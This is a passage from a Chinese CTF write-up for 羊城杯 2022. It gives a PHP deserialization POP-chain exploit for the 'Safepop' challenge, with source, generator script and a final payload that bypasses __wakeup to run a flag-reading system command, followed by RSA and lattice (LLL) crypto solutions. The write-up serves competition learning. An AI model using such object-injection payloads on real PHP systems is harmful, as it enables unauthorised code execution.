class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;c1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;bei&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;b1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;yang&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;y1&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;b2&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(11).PNG" alt="1280X1280 (11)"></p>
<h3 id="safepop"><a class="markdownIt-Anchor" href="#safepop"></a> Safepop</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=[<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;getFlag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;p=<span class="string">&quot;getFlag&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="variable">$f</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot; Fun func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>这个题一看就是需要去调那个<code>getFlag</code>方法，但是这里<code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>看到了过滤说明直接调用肯定是不行的，所以我们是需要通过Fun类的回调函数去调用的，这样就可以绕过过滤。</p>
<p>同时还有个问题就是weakup，看了一眼php版本，php7.3可能是还有绕过，不然这题没法做了。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(12).PNG" alt="1280X1280 (12)"></p>
<p>然后我们就是需要挖链子，这里还有个小问题就是<code>throw new Exception(&quot;no pop&quot;);</code>会抛出异常，绕过他的方式是要让反序列化的内容有错，这里我一直习惯是用数组去改绕过，但是因为这里最后是要改大小绕weakup的所以不用数组也行。这里<code>$b-&gt;p=&quot;getFlag&quot;;</code>也不需要一定赋值<code>getFlag</code>，只要是随便一个B里面没有的方法就行，这里一开始是直接调的Test，所以赋了这个，懒得改了，这里私有方法记得加%00或者url编码一下。还有要改一下B那里改大一点，改成了3.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?pop=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Fun&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00Fun%00func&quot;</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(13).PNG" alt="img"></p>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="easyrsa"><a class="markdownIt-Anchor" href="#easyrsa"></a> EasyRsa</h3>
<p>唔，找到一个素数因子，直接分解n。然后就是常规操作，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file  = <span class="string">&quot;D:\\桌面\\CRYPTO附件\\task\\output.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    A.append(n)</span><br><span class="line">A = A[::-<span class="number">1</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c=<span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c,d,n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A:</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="keyword">assert</span> p*q == n</span><br><span class="line">    phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">    d = inverse(e,phi)</span><br><span class="line">    m = decrypt(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(m,e,n)==c)</span><br><span class="line">    c = m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>
<h3 id="lrsa"><a class="markdownIt-Anchor" href="#lrsa"></a> <strong>LRSA</strong></h3>
<p>根据</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>58</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>P</mi><mo>+</mo><mi>q</mi><mo>−</mo><mi>t</mi><mo>−</mo><mi>k</mi><mi>Q</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">(p-58)*P+q-t - kQ=0
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69841em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></span></p>
<p>构造格子</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>P</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>Q</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix}
1 &amp; 0 &amp; P\\ 
0 &amp; 1 &amp; 1\\
0 &amp; 0 &amp; Q
\end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M291 0 H417 V300 H291 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M457 0 H583 V300 H457 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>我们需要的向量(p-58,q-44,k)量级大概在1024bit，那么需要对我们构造的lattice进行放大</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>1017</mn></msup><mi>P</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1017</mn></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>1017</mn></msup><mi>Q</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix} 1 &amp; 0 &amp; 2^{1017}P\\  0 &amp; 1 &amp; 2^{1017}\\ 0 &amp; 0 &amp; 2^{1017}Q \end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M291 0 H417 V300 H291 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M457 0 H583 V300 H457 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>使用LLL算法得到(p-58,q-44,k)，即可分解n。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">B=<span class="number">1023</span></span><br><span class="line">PPQ=<span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ=<span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t=<span class="number">44</span></span><br><span class="line">c=<span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">PQ = gmpy2.gcd(PPQ,PQQ)</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">p = <span class="number">80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137205</span>+<span class="number">58</span></span><br><span class="line">q = <span class="number">71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586407</span>+<span class="number">44</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,p*q)))</span><br></pre></td></tr></table></figure>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h3>
<p>直接ciphey识别解码就OK</p>
